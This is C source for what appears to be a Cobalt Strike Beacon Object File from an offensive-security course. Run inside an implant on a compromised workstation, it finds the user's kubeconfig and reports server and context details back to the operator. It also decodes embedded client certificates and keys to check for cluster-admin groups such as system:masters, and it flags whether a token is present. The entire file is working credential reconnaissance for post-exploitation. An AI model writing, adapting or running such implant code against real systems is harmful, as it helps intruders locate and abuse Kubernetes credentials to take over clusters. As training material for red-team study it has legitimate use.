/*
 * kubeHunter.c — kubeconfig finder + client-cert O= group scanner (OSAI T3).
 * Course: M9.2.2 kubeconfig on workstation, X.509 CN=user O=group, check
 *         O=system:masters.  ATLAS recon.  Replaces `kubectl config view --raw`.
 *
 * args: str path(empty = auto %USERPROFILE%\.kube\config)
 */
#include "aibof.h"

static void scan_b64_block(const char* label, const char* b64, int blen) {
  unsigned char* dec = (unsigned char*)intAlloc(blen + 4);
  if (!dec) return;
  int dlen = b64decode(b64, blen, dec, blen + 4);
  if (dlen <= 0) { intFree(dec); return; }
  const char* GROUPS[] = { "system:masters","system:","system:admin","O=","CN=","kubernetes-admin", NULL };
  for (int i = 0; GROUPS[i]; i++)
    if (buf_contains((char*)dec, dlen, GROUPS[i]))
      BeaconPrintf(CALLBACK_OUTPUT, "  [cert %s] contains %s (DER hit)\n", label, GROUPS[i]);
  intFree(dec);
}

static void parse_kubeconfig(const char* path) {
  unsigned char* buf = NULL; DWORD got = 0;
  if (!read_file(path, &buf, &got, 1024 * 1024)) {
    BeaconPrintf(CALLBACK_ERROR, "[-] %s unreadable\n", path); return;
  }
  BeaconPrintf(CALLBACK_OUTPUT, "===== kubeconfig %s (%lu bytes) =====\n", path, got);
  DWORD i = 0;
  while (i < got) {
    DWORD start = i;
    while (i < got && buf[i] != '\n') i++;
    int len = i - start; if (i < got) i++;
    if (len > 0 && buf[start + len - 1] == '\r') len--;
    char* line = (char*)buf + start;
    /* print server / current-context / token / user lines (low-sensitivity) */
    if (buf_contains(line, len, "server:") ||
        buf_contains(line, len, "current-context:") ||
        buf_contains(line, len, "name:") ||
        buf_contains(line, len, "namespace:")) {
      char tmp[520]; int tl = len > 511 ? 511 : len;
      xmemcpy(tmp, line, tl); tmp[tl] = 0;
      BeaconPrintf(CALLBACK_OUTPUT, "  %s\n", tmp);
    }
    /* base64 data blocks -> decode + scan for groups */
    const char* b64labels[] = { "client-certificate-data:","client-key-data:",
                                "certificate-authority-data:", NULL };
    for (int k = 0; b64labels[k]; k++) {
      int llen = (int)xlen(b64labels[k]);
      if (len > llen && buf_contains(line, len, b64labels[k])) {
        const char* v = line + llen;
        int vl = len - llen;
        while (vl > 0 && (*v == ' ' || *v == '\t')) { v++; vl--; }
        scan_b64_block(b64labels[k], v, vl);
      }
    }
    if (buf_contains(line, len, "token:"))
      BeaconPrintf(CALLBACK_OUTPUT, "  [token] (present, %d chars)\n", len);
  }
  BeaconPrintf(CALLBACK_OUTPUT, "===== /kubeconfig =====\n");
  intFree(buf);
}

void go(char* args, int alen) {
  datap p; BeaconDataParse(&p, args, alen);
  char* path = BeaconDataExtract(&p, NULL);
  if (path && *path) { parse_kubeconfig(path); return; }
  /* auto: %USERPROFILE%\.kube\config */
  char up[300]; DWORD upl = KERNEL32$GetEnvironmentVariableA("USERPROFILE", up, sizeof up - 20);
  if (upl == 0 || upl >= sizeof up - 20) {
    BeaconPrintf(CALLBACK_ERROR, "no USERPROFILE; pass explicit path\n"); return;
  }
  char cfg[320]; int n = (int)upl;
  xmemcpy(cfg, up, n); xmemcpy(cfg + n, "\\.kube\\config", 14);
  parse_kubeconfig(cfg);
  /* also try a .k3s/kubeconfig-style alt */
  xmemcpy(cfg + n, "\\config", 8);
  /* best-effort: only if the primary didn't exist we already reported; skip alt noise */
  BeaconPrintf(CALLBACK_OUTPUT, "[*] kubeHunter done\n");
}